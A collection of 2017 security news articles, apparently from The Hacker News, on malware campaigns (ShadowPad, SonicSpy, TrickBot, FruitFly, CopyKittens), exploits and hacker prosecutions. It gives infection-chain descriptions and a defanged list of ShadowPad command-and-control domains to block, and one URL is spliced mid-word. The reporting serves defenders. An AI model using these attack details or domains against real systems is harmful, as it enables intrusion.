piece of information.\" Users of Apple Mac OS X Safari ends up on a web page similar to when using Firefox, but it was customised for MacOS users with a fake update for Flash Media Player, which if clicked, downloads an OSX executable .dmg file, which is also adware. Same in case of Linux, user redirects to another landing page designed for Linux users. The attackers behind the campaign are not actually infecting users of all platform with any banking Trojan or exploit kits, but with adware to make a lot of money by generating revenue from ads. Spam campaigns on Facebook are quite common. A few years ago, researchers found cyber criminals using boobytrapped .JPG image files to hide their malware in order to infect Facebook users with variants of the Locky ransomware, which encrypts all files on the infected PC until a ransom is paid. To keep yourself safe, you are advised not to get curious to look at images or video links sent by anyone, even your friend, without verifying it with them, and always keep your antivirus software up-to-date." }

They are now adopting more clandestine techniques that come with limitless attack vectors and are harder to detect. Recently, cyber crooks managed to infiltrate the update mechanism for a popular server management software package and altered it to include an advanced backdoor, which lasts for at least 17 days until researchers discovered it. Dubbed ShadowPad, the secret backdoor gave attackers complete control over networks hidden behind legit cryptographically signed software sold by NetSarang—used by hundreds of banks, media firms, energy companies, and pharmaceutical firms, telecommunication providers, transportation and logistics and other industries—for 17 days starting last month. Important Note — If you are using any of the affected product (listed below), we highly recommend you stop using it until you update them. Hacker Injected Backdoor Through Software Update Mechanism According to researchers at Kaspersky Labs, who discovered this well-hidden backdoor, someone managed to hijack the NetSarang's update mechanism and silently insert the backdoor in the software update, so that the malicious code would silently deliver to all of its clients with NetSarang's legitimate signed certificate. The attackers of the Petya/NotPetya ransomware that infected computers around the world in June used the same tactic by compromising the update mechanism for Ukrainian financial software provider called MeDoc and swapped in a dodgy update including NotPetya. \"ShadowPad is an example of the dangers posed by a successful supply-chain attack,\" Kaspersky Lab researchers said in their blog post published Tuesday. \"Given the opportunities for covert data collection, attackers are likely to pursue this type of attack again and again with other widely used software components.\" The secret backdoor was located in the nssock2.dll library within NetSarang's Xmanager and Xshell software suites that went live on the NetSarang website on July 18. However, Kaspersky Labs researchers discovered the backdoor and privately reported it to the company on August 4, and NetSarang immediately took action by pulling down the compromised software suite from its website and replacing it with a previous clean version. The affected NetSarang's software packages are: Xmanager Enterprise 5.0 Build 1232 Xmanager 5.0 Build 1045 Xshell 5.0 Build 1322 Xftp 5.0 Build 1218 Xlpd 5.0 Build 1220 Hackers Can Remotely Trigger Commands The attackers hide the ShadowPad backdoor code in several layers of encrypted code that were decrypted only in intended cases. \"The tiered architecture prevents the actual business logics of the backdoor from being activated until a special packet is received from the first tier command and control (C&C) server (activation C&C server),\" the researchers wrote. Until then, the backdoor pings out every 8 hours to a command-and-control server with basic information on the compromised computers, including their domain names, network details, and usernames. Here's how the attackers activate the backdoor: The activation of the backdoor was eventually triggered by a specially crafted DNS TXT record for a specific domain name. The domain name is generated based on the current month and year, and performs a DNS lookup on it. Once triggered, the command and control DNS server in return sends back the decryption key which is downloaded by the software for the next stage of the code, effectively activating the backdoor. Once activated, the ShadowPad backdoor provides a full backdoor for an attacker to download and run arbitrary code, create processes, and maintain a virtual file system (VFS) in the registry, which is encrypted and stored in locations unique to each victim. Kaspersky researchers said they could confirm activated backdoor in one case, against an unnamed company located in Hong Kong. How to Detect this Backdoor and Protect Your Company The company has rolled out an update to kill the malicious software on August 4, and is investigating how the backdoor code got into its software. Anyone who has not updated their NetSarang software since then is highly recommended to upgrade to the latest version of the NetSarang package immediately to protect against any threats. Additionally, check if there were DNS requests from your organization to the following list of domains. If yes, the requests to those domains should be blocked. ribotqtonut[.]com nylalobghyhirgh[.]com jkvmdmjyfcvkf[.]com bafyvoruzgjitwr[.]com xmponmzmxkxkh[.]com tczafklirkl[.]com notped[.]com dnsgogle[.]com operatingbox[.]com paniesx[.]com techniciantext[.]com NetSarang installation kits from April do not include the malicious library." }

The Microsoft Office remote code execution vulnerability (CVE-2017-0199) resided in the Windows Object Linking and Embedding (OLE) interface for which a patch was issued in April this year, but threat actors are still abusing the flaw through the different mediums. Security researchers have spotted a new malware campaign that is leveraging the same exploit, but for the first time, hidden behind a specially crafted PowerPoint (PPSX) Presentation file. According to the researchers at Trend Micro, who spotted the malware campaign, the targeted attack starts with a convincing spear-phishing email attachment, purportedly from a cable manufacturing provider and mainly targets companies involved in the electronics manufacturing industry. Researchers believe this attack involves the use of a sender address disguised as a legitimate email sent by a sales and billing department. Here's How the Attack Works: The complete attack scenario is listed below: Step 1: The attack begins with an email that contains a malicious PowerPoint (PPSX) file in the attachment, pretending to be shipping information about an order request. Step 2: Once executed, the PPSX file calls an XML file programmed in it to download \"logo.doc\" file from a remote location and runs it via the PowerPoint Show animations feature. Step 3: The malformed Logo.doc file then triggers the CVE-2017-0199 vulnerability, which downloads and executes RATMAN.exe on the targeted system. Step 4: RATMAN.exe is a Trojanized version of the Remcos Remote Control tool, which when installed, allows attackers to control infected computers from its command-and-control server remotely. Remcos is a legitimate and customizable remote access tool that allows users to control their system from anywhere in the world with some capabilities, like a download and execute the command, a keylogger, a screen logger, and recorders for both webcam and microphone. Since the exploit is used to deliver infected Rich Text File (.RTF) documents, most detection methods for CVE-2017-0199 focuses on the RTF. So, the use of a new PPSX files allows attackers to evade antivirus detection as well. The easiest way to prevent yourself completely from this attack is to download and apply patches released by Microsoft in April that will address the CVE-2017-0199 vulnerability." }

Someone has managed to flood third-party app stores and Google Play Store with more than a thousand malicious apps, which can monitor almost anything a user does on their mobile device from silently recording calls to make outbound calls without the user’s interaction. Dubbed SonicSpy, the spyware has been spreading aggressively across Android app stores since at least February and is being distributed by pretending itself to be a messaging app—and it actually offers a messaging service. SonicSpy Can Perform a Whole Lots of Malicious Tasks At the same time, the SonicSpy spyware apps perform various malicious tasks, including silently recording calls and audio from the microphone, hijacking the device's camera and snap photos, making outbound calls without the user's permission, and sending text messages to numbers chosen by the attacker. Besides this, the SonicSpy spyware also steals user information including call logs, contacts and information about Wi-Fi access point the infected device has connected to, which could easily be used to track the user's location. The spyware was discovered by security researchers at mobile security firm Lookout. The researchers also uncovered three versions of the SonicSpy-infected messaging app in the official Google Play Store, which had been downloaded thousands of times. Although the apps in question—Soniac, Hulk Messenger and Troy Chat—have since been removed by Google from the Play Store, they are still widely available in third-party app stores along with other SonicSpy-infected apps. Iraq Connection to the SonicSpy Spyware The researchers believe the malware is related to a developer based in Iraq and say the overall SonicSpy malware family supports 73 different remote instructions that its attacker could execute on an infected Android device. The connection of Iraq to the spyware stems from similarities between SonicSpy and SpyNote, another Android malware that was discovered in July 2016, which was masquerading as a Netflix app and was believed to have been written by an Iraqi hacker. \"There are many indicators that suggest the same actor is behind the development of both. For example, both families share code similarities, regularly make use of dynamic DNS services, and run on the non-standard 2222 port,\" says Lookout Security Research Services Technology Lead Michael Flossman. Also, the important indicator is the name of the developer account behind Soniac, listed on the Google Play store, was \"iraqiwebservice.\" Here's How the SonicSpy Spyware Works One of the SonicSpy-infected messaging apps that made it through Google's Play Store masqueraded as a communications tool called Soniac. Once installed, Soniac removes its launcher icon from the smartphone menu to hide itself from the victim and connects to a command and control (C&C) server in an attempt to install a modified version of the Telegram app. However, the app actually includes many malicious features which allowed the attackers to gain almost full control of the infected device and turn it a spy in your pocket that could silently record audio, make calls, take photos, and pilfer your personal data, including call logs, contacts and details about Wi-Fi access points. Before being removed by Google, the app had already been downloaded between 1,000 and 5,000 times, but since it was part of a family of 1,000 variants, the malware could have infected many thousands more. SonicSpy Could Get Into Play Store Again Although SonicSpy-infected apps have now been removed from the Play Store, the researchers warned that the malware could potentially get into the Play Store again with another developer account and different app interface. \"The actors behind this family have shown that they're capable of getting their spyware into the official app store and as it's actively being developed, and its build process is automated, it's likely that SonicSpy will surface again in the future,\" the researchers warned. While Google has taken many security measures to prevent malicious apps from making through Google's security checks, malicious apps still make their ways into the Play Store. Just last month, we warned you about a clever malware, called Xavier, that was discovered in over 800 different Android apps that had been downloaded millions of times from Google Play Store and silently collected sensitive user data and can perform dangerous tasks. In April, we reported about the BankBot banking trojan making its way to Google Play Store with the ability to get administrator privileges on infected devices and perform a broad range of malicious tasks, including stealing victim's bank logins. In the same month, about 2 Million Android users fell victim to the FalseGuide malware hidden in more than 40 apps for popular mobile games, such as Pokémon Go and FIFA Mobile, on the official Google Play Store. How to Protect yourself against such Malware The easiest way to prevent yourself from being targeted by such clever malware, always beware of fishy apps, even when downloading them from official Google Play Store and try to stick to the trusted brands only. Moreover, always look at the reviews left by users who have downloaded the app and verify app permissions before installing any app even from the official app stores and grant those permissions that are relevant for the app's purpose. Also, do not download apps from third party source. Although in this case, the app is also being distributed through the official Play Store, most often victims became infected with such malware via untrusted third-party app stores. Last but not the least, you are strongly advised to always keep good antivirus software on your device that can detect and block such malware before they infect your device, and keep your device and apps up-to-date." }

Even in March this year, a team of researchers successfully stored digital data — an entire operating system, a movie, an Amazon gift card, a study and a computer virus — in the strands of DNA. But what if someone stores a malicious program into the DNA, just like an infected USB storage, to hijack the computer that reads it. A team of researchers from the University of Washington in Seattle have demonstrated the first successful DNA-based exploit of a computer system that executes the malicious code written into the synthesised DNA strands while reading it. To carry out the hack, the researchers created biological malware and encoded it in a short stretch of DNA, which allowed them to gain \"full control\" of a computer that tried to process the genetic data when read by a DNA sequencing machine. The DNA-based hack becomes possible due to lack of security in multiple DNA processing software available online, which contains insecure function calls and buffer overﬂow vulnerabilities. \"We analysed the security of 13 commonly used, open source programs. We selected these programs methodically, choosing ones written in C/C++,\" reads the research paper [PDF], titled \"Computer Security, Privacy, and DNA Sequencing: Compromising Computers with Synthesized DNA, Privacy Leaks, and More.\" \"We found that existing biological analysis programs have a much higher frequency of insecure C runtime library function calls (e.g., strcpy). This suggests that DNA processing software has not incorporated modern software security best practices.\" To create the biological malware, the researchers translated a simple computer program into a short stretch of 176 DNA letters, denoted as A, G, C, and T, each representing a binary pair (A=00, C=01, G=10, T=11). The exploit took advantage of a basic buffer overflow attack, in which a software program executes the malicious command because it falls outside maximum length. The command then contacted a server controlled by the team, from where the researchers took control of a computer in their laboratory they were using to analyse the DNA file. \"Our exploit did not target a program used by biologists in the ﬁeld; rather it targeted one that we modiﬁed to contain a known vulnerability,\" the researchers said. Although this kind of hack probably doesn't pose any threat anytime soon, the team warned that hackers could in future use fake blood or spit samples to gain access to computers, steal information, or hack medical equipments installed at forensic labs, hospitals and the DNA-based data storage centers. The researchers will be presenting this first \"DNA-based exploit of a computer system\" at the next week's Usenix Security Symposium in Vancouver. For the more in-depth explanation on the DNA-based hack, you can head on to the research paper." }

MalwareTech Arrested After Attending Def Con Event Hutchins was recently arrested at the McCarran International Airport before he could board his flight back to the U.K. after attending Def Con event for his alleged role in creating and distributing the Kronos Banking Trojan between 2014-2015. Kronos is a Banking Trojan designed to steal banking credentials and personal information from victims' computers, which was sold for $7,000 on Russian online forums. MalwareTech to Pay $30,000 for Bail, But Can't Leave US In a police interview, Hutchins admitted of writing the code of malware that targeted bank accounts, US prosecutors said during a hearing on Friday, but during the hearing at a Las Vegas court, he pleaded not guilty. The judge at Las Vegas court ruled on Friday that Hutchins could be released on $30,000 bail, saying the defendant wasn't a danger to the community nor a flight risk, though the judge ordered him to remain in the U.S. with GPS monitoring. Unfortunately, since the clerk's office closed at 4 PM, the bail did not happen yet. The attorney expects Hutchins will be released on Monday but will need to appear in Wisconsin for facing the grand jury indictment on Tuesday (8 August). Adrian Lobo, Hutchins' defence attorney (in above video), later confirmed to the local reporter Christy Wilcox. \"We intend to fight the case,\" Lobo said. \"He has dedicated his life to researching malware, not to try to harm people. He has tremendous community support, local and abroad and in the computer world.\" Hutchins, along with another unnamed co-defendant, is currently facing six counts of hacking-related charges from the United States Department of Justice (DoJ) for writing the Kronos virus in 2014. If Found Guilty, MalwareTech Could Face 40 Years In US Prison Hutchins was also charged with five other counts, including wiretapping and violating Computer Fraud and Abuse Act. If convicted, Hutchins faces a maximum of 40 years in jail. Hutchins' supporters believe that he is innocent and claims a tweet from July 2014 proves he could not have written the malware.

Senakh was extradited to the United States in February 2016 to face charges and pleaded guilty in late March this year after admitting of creating a massive Ebury botnet and personally being profited from the scheme. First spotted in 2011, Ebury is an SSH backdoor Trojan for Linux and Unix-style operating systems, such as FreeBSD or Solaris, which gives attackers full shell control of an infected machine remotely even if the password for affected user account is changed regularly. Senakh and his associates used the malware to build an Ebury botnet network of thousands of compromised Linux systems, which had the capacity of sending over 35 million spam messages and redirecting more than 500,000 online visitors to exploit kits every day. Senakh fraudulently generated millions of dollars in revenue running spam campaigns and committing advertising click frauds. \"Working within a massive criminal enterprise, Maxim Senakh helped create a sophisticated infrastructure that victimized thousands of Internet users across the world,\" said Acting U.S. Attorney Brooker. \"As society becomes more reliant on computers, cyber criminals like Senakh pose a serious threat. This Office, along with our law enforcement partners, is committed to detecting and prosecuting cyber criminals no matter where they reside.\" Ebury first came into headlines in 2011 after Donald Ryan Austin, 27, of El Portal, Florida, installed the Trojan on multiple servers owned by kernel.org and the Linux Foundation, which maintain and distribute the Linux operating system kernel. Austin, with no connection to the Ebury criminal gang, was arrested in September last year and was charged with 4 counts of intentional transmission causing damage to a protected computer. Senakh was facing up to a combined 30 years in prison, after pleading guilty to conspiracy to commit wire fraud as well as violate the Computer Fraud and Abuse Act. However, a US judge on Thursday sentenced Senakh to 46 months in prison, the Department of Justice announced on Thursday. The case was investigated by the Federal Bureau of Investigation's field office in Minneapolis. Senakh will be deported back to Russia following his release from the U.S. prison." }

Security researchers have now discovered at least one group of cyber criminals that are attempting to give its banking Trojan the self-spreading worm-like capabilities that made recent ransomware attacks go worldwide. The new version of credential stealing TrickBot banking Trojan, known as \"1000029\" (v24), has been found using the Windows Server Message Block (SMB)—that allowed WannaCry and Petya to spread across the world quickly. TrickBot is a banking Trojan malware that has been targeting financial institutions across the world since last year. The Trojan generally spreads via email attachments impersonating invoices from a large unnamed \"international financial institution,\" but actually leads victims to a fake login page used to steal credentials. Last week, researchers at Flashpoint, who've been continually tracking TrickBot activities and its targets, have discovered that the TrickBot Trojan has just been evolved to spread locally across networks via Server Message Block (SMB). Since the new version of TrickBot is still being tested, the new features are not fully implemented by the hacking gang behind the Trojan. It also doesn't have the ability to randomly scan external IPs for SMB connections, unlike WannaCry which exploited a vulnerability dubbed EternalBlue. Flashpoint researchers said the trojan is modified to scan domains for lists of vulnerable servers via the NetServerEnum Windows API and enumerate other computers on the network via Lightweight Directory Access Protocol (LDAP). The new TrickBot variant can also be disguised as 'setup.exe' and delivered through a PowerShell script to spread through interprocess communication and download additional version of TrickBot onto shared drives. According to the researchers, the latest discovery of new TrickBot variant provides an insight into what the operators behind the malware might be using in the near-future. \"Flashpoint assesses with moderate confidence that the Trickbot gang will likely continue to be a formidable force in the near term,\" said Vitali Kremez, director of Research at Flashpoint. \"Even though the worm module appears to be rather crude in its present state, it's evident that the Trickbot gang learned from the global ransomware worm-like outbreaks of WannaCry and 'NotPetya' and is attempting to replicate their methodology.\" In order to safeguard against such malware infection, you should always be suspicious of unwanted files and documents sent over an email and should never click on links inside them unless verifying the source. To always have a tight grip on your valuable data, keep a good backup routine in place that makes their copies to an external storage device that is not always connected to your PC. Moreover, make sure that you run an effective anti-virus security suite on your system, and keep it up-to-date." }

Not Really, Maybe, It's Complex!", "Address" : "https://thehackernews.com/2017/08/hacking-amazon-echo-spying.html", "Date" : "2017-08-01T21:12:00-11:00", "Article" : "Do you own an Amazon Echo? So are you also worried about hackers turning out your device into a covert listening device? Just relax, if there's no NSA, no CIA or none of your above-skilled friends after you. Since yesterday there have been several reports on Amazon Echo hack that could allow a hacker to turn your smart speaker into a covert listening device, but users don’t need to worry because the hack is not simple, requires physical access to the device and does not work on all devices, as well. Amazon Echo is an always-listening voice-activated smart home speaker that is designed to play music, set alarms, answer questions via the Alexa voice assistant, and control connected smart home devices like WeMo, Hive and Nest. Hack Turns Amazon Echo Into Spying Device (But It's Complex) Now researchers from MWR InfoSecurity have demonstrated a hack, showing how hackers can exploit a vulnerability in some models of Amazon Echo to turn them into covert listening devices that can secretly record your most intimate moments. But the hack is not simple and has some significant limitations: The first major limitation of the Amazon Echo hack is that it does involve the hacker being able to gain physical access to the device, though, according to researchers, it is possible to tamper with the Echo without leaving any traces behind. The second limitation is that the Amazon Echo hack works only against older models, as the vulnerability discovered by MWR researchers only affects the 2015 and 2016 versions of the AI-powered speaker. Another major limitation to carry out this hack is that the attacker should be above average skills in Linux as well as embedded hardware systems. In short, it is a very sophisticated hack that first requires James Bond to bypass all CCTV cameras, if you have, to stealthily gain physical access to your premises, and then at least 30 minutes spare time with the Amazon Echo to install the malware without leaving any traces of tampering. In another scenario, as described by the researchers, your house cleaner or maid who has access to your device could also perform this attack, so the researchers dubbed the attack as \"evil maid.\" However, the 'evil maid' attack is not as impressive as it sounds because in such highly targeted scenario one can simply implant bugging devices with less effort, knowledge and time. Hacking Amazon Echo: How It Works? In order to carry out the evil maid hack, MWR Labs security researcher Mark Barnes first removed the Echo's rubber base on the bottom, which allowed them to access 18 debug \"pads\" Amazon engineers rely on to carry out various diagnostics. Barnes then directly booted into the actual firmware of the device via an external SD card. From there, he was able to install persistent malware without leaving any physical traces of tampering with the device. The malware then allowed the researcher to gain remote root shell access of the device, and ultimately access to the 'always listening' microphones. \"Once we'd root we examined the processes running on the device and the scripts that spawn these processes,\" Barnes wrote. \"We were able to understand how audio media is being passed and buffered between processes and the tools that are used to create and interact with these audio buffers.\" Barnes said his team then developed scripts that leveraged tools embedded on the Amazon Echo to continuously stream the raw microphone audio over TCP/IP to a remote server without affecting the actual functionality of the device itself. This eventually means that hackers, at least theoretically, can covertly monitor and listen in on users conversations and steal private data without their permission or even realisation. \"The rooting of the Amazon Echo device in itself was trivial; however, it raises a number of important questions for manufacturers of Internet enabled or 'Smart Home' devices,\" Barnes added. The researcher warned users from buying smart speakers from third-party retailers, along with advising them to push the Echo's mute button to disable the microphone physically. In response to the MWR's findings, Amazon released a statement saying the best way for users to protect themselves from such tamperings is always to buy the Echo from the company directly. \"Customer trust is very important to us. To help ensure the latest safeguards are in place, as a general rule, we recommend customers purchase Amazon devices from Amazon or a trusted retailer and that they keep their software up-to-date,\" the company said. Users owning 2017 models of the device are not affected by this latest hack, as the new models introduced a mitigation that joins two of the crucial debugging pads in a way that prevents the device from external booting." }

The campaign is being conducted by an Iran-linked threat group, whose activities, attack methods, and targets have been released in a joint, detailed report published by researchers at Trend Micro and Israeli firm ClearSky. Dubbed by researchers CopyKittens (aka Rocket Kittens), the cyber espionage group has been active since at least 2013 and has targeted organisations and individuals, including diplomats and researchers, in Israel, Saudi Arabia, Turkey, the United States, Jordan and Germany. The targeted organisations include government institutions like Ministry of Foreign Affairs, defence companies, large IT companies, academic institutions, subcontractors of the Ministry of Defense, and municipal authorities, along with employees of the United Nations. The latest report [PDF], dubbed \"Operation Wilted Tulip,\" details an active espionage campaign conducted by the CopyKittens hackers, a vast range of tools and tactics they used, its command and control infrastructure, and the group's modus operandi. How CopyKittens Infects Its Targets The group used different tactics to infiltrate their targets, which includes watering hole attacks — wherein JavaScript code is inserted into compromised websites to distribute malicious exploits. The news media and organisations whose websites were abused as watering hole attacks include The Jerusalem Post, for which even German Federal Office for Information Security (BSI) issued an alert, Maariv news and IDF Disabled Veterans Organization. Besides water hole attacks, CopyKittens also used other methods to deliver malware, including: Emailed links to malicious websites controlled by attackers. Weaponized Office documents exploiting recently discovered flaw (CVE-2017-0199). Web servers exploitation using vulnerability scanner and SQLi tools like Havij, sqlmap, and Acunetix. Fake social media entities to build trust with targets and potentially spread malicious links. \"The group uses a combination of these methods to persistently target the same victim over multiple platforms until they succeed in establishing an initial beachhead of infection – before pivoting to higher value targets on the network,\" Trend Micro writes in a blog post. In order to infect its targets, CopyKittens makes use of its own custom malware tools in combination with existing, commercial tools, like Red Team software Cobalt Strike, Metasploit, post-exploitation agent Empire, TDTESS backdoor, and credential dumping tool Mimikatz. Dubbed Matryoshka, the remote access trojan is the group's self-developed malware which uses DNS for command and control (C&C) communication and has the ability to steal passwords, capture screenshots, record keystrokes, collect and upload files, and give the attackers Meterpreter shell access. \"Matryoshka is spread through spear phishing with a document attached to it. The document has either a malicious macro that the victim is asked to enable or an embedded executable the victim is asked to open,\" Clear Sky says in a blog post. The initial version of the malware was analysed in 2015 and seen in the wild from July 2016 until January 2017, though the group also developed and used Matryoshka version 2. Users are recommended to enable two-factor authentication in order to protect their webmail accounts from being compromised, which is a treasure trove of information for hackers, and an \"extremely strong initial beachhead\" for pivoting into other targets." }

According to reports in the German press, the British man, who was using online monikers \"Peter Parker\" and \"Spiderman,\" linked to domains used to launch cyber attacks powered by the notorious Mirai malware has been pleaded guilty to \"attempted computer sabotage.\" The suspect was arrested on 22nd February this year at Luton airport in London by Britain's National Crime Agency (NCA) at the request of the Federal Criminal Police Office of Germany, aka the Bundeskriminalamt (BKA). The hacker, also known as 'BestBuy,' admitted to the court on Friday that he was behind the cyber attack that knocked more than 1.25 Million customers of German telecommunications provider Deutsche Telekom offline last November. According to the German authorities, the attack was especially severe and was carried out to compromise the home routers to enrol them in a network of hijacked devices popularly called Botnet, which is being offered for sale on dark web markets for launching DDoS attacks. Late last year, Deutsche Telekom's routers became infected with a modified version of the Mirai malware – infamous IoT malware which scans for insecure routers, cameras, DVRs, and other IoT devices and enslaves them into a botnet network – causing over a million pounds' worth of damage, the company said at the time. Mirai is the same botnet that knocked the entire Internet offline last year by launching massive distributed denial of Service (DDoS) attacks against the Dyn DNS provider, crippling some of the world's biggest and most popular websites, including Twitter, Netflix, Amazon, Slack, and Spotify. Mirai leveraged attack experienced sudden rise after a cyber criminal in October 2016 publicly released the source code of Mirai, which is then used to by many cyber criminals to launch DDoS attacks. The hacker reportedly told the court that a Liberian internet service provider (ISP) paid him $10,000 to carry out the attack against its competitors., and that Deutsche Telekom was not the main target of his attack. At the time of his arrest, the suspect faced up to 10 years in prison. He's due to be sentenced on July 28. The BKA got involved in the investigation as the attack on Deutsche Telekom was deemed to be a threat to the nation's communication infrastructure. The investigation involved close cooperation between British, German and Cypriot law enforcement agencies, backed by the European Union's law enforcement intelligence agency, Europol, and Eurojust." }

A Nearly-Undetectable Malware Targeting Mac Computers", "Address" : "https://thehackernews.com/2017/07/macos-malware-fruitfly.html", "Date" : "2017-07-24T22:51:00-11:00", "Article" : "Yes, even Mac could also get viruses that could silently spy on its users. So, if you own a Mac and think you are immune to malware, you are wrong. An unusual piece of malware that can remotely take control of webcams, screen, mouse, keyboards, and install additional malicious software has been infecting hundreds of Mac computers for more than five years—and it was detected just a few months back. Dubbed FruitFly, the Mac malware was initially detected earlier this year by Malwarebytes researcher Thomas Reed, and Apple quickly released security patches to address the dangerous malware. Now months later, Patrick Wardle, an ex-NSA hacker and now chief security researcher at security firm Synack, discovered around 400 Mac computers infected with the newer strain of the FruitFly malware (FruitFly 2) in the wild. Wardle believes the number of infected Macs with FruitFly 2 would likely be much higher, as he only had access to some servers used to control FruitFly. Although it is unknown who is behind FruitFly or how the malware gets into Mac computers, the researchers believe the nasty malware has been active for around ten years, as some of its code dates back to as far as 1998. \"FruitFly, the first OS X/macOS malware of 2017, is a rather intriguing specimen. Selectively targeting biomedical research institutions, it is thought to have flown under the radar for many years,\" Wardle wrote in the abstract of his talk, which he is going to present at the Black Hat later this week. Since the initial infection vector for FruitFly is unclear, like most malware, Fruitfly could likely infect Macs either through an infected website delivering the infection or via phishing emails or a booby-trapped application. FruitFly is surveillance malware that's capable of executing shell commands, moving and clicking a mouse cursor, capturing webcam, killing processes, grabbing the system's uptime, retrieving screen captures, and even alerting the hacker when victims are again active on their Mac. \"The only reason I can think of that this malware has not been spotted before now is that it is being used in very tightly targeted attacks, limiting its exposure,\" Reed wrote in the January blog post. \"Although there is no evidence at this point linking this malware to a specific group, the fact that it has been seen specifically at biomedical research institutions certainly seems like it could be the result of exactly that kind of espionage.\" Wardle was able to uncover FruitFly victims after registering a backup command and control (C&C) server that was once used by the attacker. He then noticed around 400 Mac users infected with FruitFly started connecting to that server. From there, the researcher was also able to see IP addresses of FruitFly infected victims, indicating 90 percent of victims were located in the United States. Wardle was even able to see the name of victims' Macs as well, making it \"really easy to pretty accurately say who is getting infected,\" he told Forbes. But rather than taking over those computers or spying on the victims, Wardle contacted law enforcement and handed over what he found to law enforcement agents, who are now investigating the matter. Wardle believes surveillance was the primary purpose of FruitFly, though it is yet unclear whether it is government or other hacker groups. \"This did not look like cyber crime type behaviour; there were no ads, no keyloggers, or ransomware,\" Wardle said. \"Its features had looked like they were actions that would support interactivity—it had the ability to alert the attacker when users were active on the computer, it could simulate mouse clicks and keyboard events.\" Since the Fruitfly's code even includes Linux shell commands, the malware would work just fine on Linux operating system. So, it would not come as a surprise if a Linux variant of Fruitfly was in operation." }

This week has been very short with big news from shutting down of two of the largest Dark Web marketplaces and theft of millions of dollars in the popular Ethereum cryptocurrency to the discovery of new Linux malware leveraging SambaCry exploit. We are here with the outline of this week's stories, just in case you missed any of them. We recommend you read the entire thing (just click 'Read More' because there's some valuable advice in there as well). Here's the list of this Week's Top Stories: 1. Feds Shuts Down AlphaBay and Hansa Dark Web Markets — Dream Market Under Suspicion On Thursday, Europol announced that the authorities had shut down two of the largest criminal Dark Web markets — AlphaBay and Hansa — in what's being called the largest-ever international operation against the dark web's black market conducted by the FBI, DEA and Dutch National Police. Interestingly, the federal authorities shut down AlphaBay, but before taking down Hansa market, they took control of the Dark Web market and kept it running for at least a month in an effort to monitor the activities of its visitors, including a massive flood of Alphabay refugees. After the shutdown of both AlphaBay and Hansa, Dream Market has emerged as the leading player, which has been in business since 2013, but it has now been speculated by many dark web users that Dream Market is also under police control.

For more details about the Bad Taste vulnerability and its PoC — Read More. 6. New Malware Exploits SambaCry to Hijack NAS Devices Despite being patched in late May, the SambaCry vulnerability is currently being leveraged by a new piece of malware to target the Internet of Things (IoT) devices, particularly Network Attached Storage (NAS) appliances. SambaCry is a 7-year-old critical remote code execution (RCE) vulnerability (CVE-2017-7494) in Samba networking software that could allow a hacker to remotely take full control of a vulnerable Linux and Unix machines. The flaw was discovered and patched two months ago, but researchers at Trend Micro warned that the flaw had been actively exploited by the SHELLBIND malware that mostly targets NAS devices used by small and medium-size businesses. For more detailed information on the SHELLBIND malware — Read More. 7. Devil's Ivy — Millions of Internet-Connected Devices At Risk This week, researchers at the IoT-focused security firm Senrio discovered a critical remotely exploitable vulnerability in an open-source software development library used by major IoT manufacturers that eventually left millions of smart devices vulnerable to hacking. Dubbed Devil's Ivy, the vulnerability (CVE-2017-9765) in the gSOAP toolkit (Simple Object Access Protocol) — an advanced C/C++ auto-coding tool for developing XML Web services and XML application. The researchers also released proof-of-concept (PoC) video demonstrating the RCE on a security camera manufactured by Axis Communications. For more detailed information on the Devil's Ivy and PoC video — Read More. 8. “Ubuntu Linux for Windows 10 Released” — Sounds So Weird? Downloading an entire operating system has just become as easy as downloading an application for Windows 10 users, as Microsoft last week announced the availability of popular Linux distro 'Ubuntu' in the Windows App Store. While the company announced its plans to launch Fedora and SUSE Linux as well on Windows Store, the company did not reveal exactly when its users can expect to see these two flavours of Linux distro on the App Store. For detailed information on how to install and run Ubuntu on Windows 10 — Read More. 9. Over 70,000 Memcached Servers Vulnerable to Hacking It's been almost eight months since the Memcached developers have patched several critical remote code execution (RCE) vulnerabilities in the software, but tens of thousands of servers running Memcached application are still vulnerable. Cisco's Talos intelligence and research group last year discovered three critical RCE vulnerabilities in Memcached — a moderhttps://thehackernews.com/2017/07/segway-hoverboard-hacking.htmln open-source and easily deployable distributed caching system that allows objects to be stored in memory. The vulnerability exposed major websites including Facebook, Twitter, YouTube, Reddit, to hackers, but the team of researchers scanned the internet on two different occasions and found that over 70,000 servers are still vulnerable to the attacks, including ransomware attacks similar to the one that hit MongoDB databases in late December. For more in-depth information on the Memcached vulnerabilities — Read More. 10. Tor Launches Bug Bounty Program for Public After its intention to launch a public bug bounty program in late December 2015, the Tor Project has finally launched a \"Bug Bounty Program,\" encouraging hackers and security researchers to find and privately report bugs that could compromise the anonymity network. The bug bounty reports will be sent through HackerOne — a startup that operates bug bounty programs for companies including Yahoo, Twitter, Slack, Dropbox, Uber, General Motors – and even the U.S. Department of Defense for Hack the Pentagon initiative. For detailed information on bug bounty prices and types of valid vulnerabilities — Read More. Other Important News This Week Besides these, there were lots of incidents happened this week, including: Microsoft's smart move to help take down cyber espionage campaigns conducted by \"Fancy Bear\" hacking group.

According to the documents leaked by WikiLeaks, Raytheon Blackbird Technologies, the Central Intelligence Agency (CIA) contractor, submitted nearly five such reports to CIA as part of UMBRAGE Component Library (UCL) project between November 2014 and September 2015. These reports contain brief analysis about proof-of-concept ideas and malware attack vectors — publically presented by security researchers and secretly developed by cyber espionage hacking groups. Reports submitted by Raytheon were allegedly helping CIA's Remote Development Branch (RDB) to collect ideas for developing their own advanced malware projects. It was also revealed in previous Vault 7 leaks that CIA's UMBRAGE malware development teams also borrow codes from publicly available malware samples to built its own spyware tools. Here's the list and brief information of each report: Report 1 — Raytheon analysts detailed a variant of the HTTPBrowser Remote Access Tool (RAT), which was probably developed in 2015. The RAT, which is designed to capture keystrokes from the targeted systems, was being used by a Chinese cyber espionage APT group called 'Emissary Panda.' Report 2 — This document details a variant of the NfLog Remote Access Tool (RAT), also known as IsSpace, which was being used by Samurai Panda, Identified as another Chinese hacking group. Equipped with Adobe Flash zero-day exploit CVE-2015-5122 (leaked in Hacking Team dump) and UAC bypass technique, this malware was also able to sniff or enumerate proxy credentials to bypass Windows Firewall. Report 3 — This report contains details about \"Regin\" -- a very sophisticated malware sample that has been spotted in operation since 2013 and majorly designed for surveillance and data collection. Regin is a cyber espionage tool, which is said to be more sophisticated than both Stuxnet and Duqu and is believed to be developed by the US intelligence agency NSA. The malware uses a modular approach that allowed an operator to enable a customised spying. Regin's design makes the malware highly suited for persistent, long-term mass surveillance operations against targets. Report 4 — It details a suspected Russian State-sponsored malware sample called \"HammerToss,\" which was discovered in early 